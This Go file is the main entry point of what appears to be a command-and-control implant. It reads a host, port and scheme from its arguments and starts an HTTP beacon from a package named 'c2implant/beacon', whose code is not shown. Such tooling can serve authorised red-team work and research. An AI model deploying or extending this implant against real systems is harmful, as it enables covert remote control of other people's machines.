package main

import (
	"fmt"
	"os"

	"c2implant/beacon"
)

func main() {
	host, port, scheme, err := beacon.ParseArgs(os.Args[1:])
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}

	httpBeacon, err := beacon.NewBeaconHTTP(host, port, scheme)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	httpBeacon.Run()
}
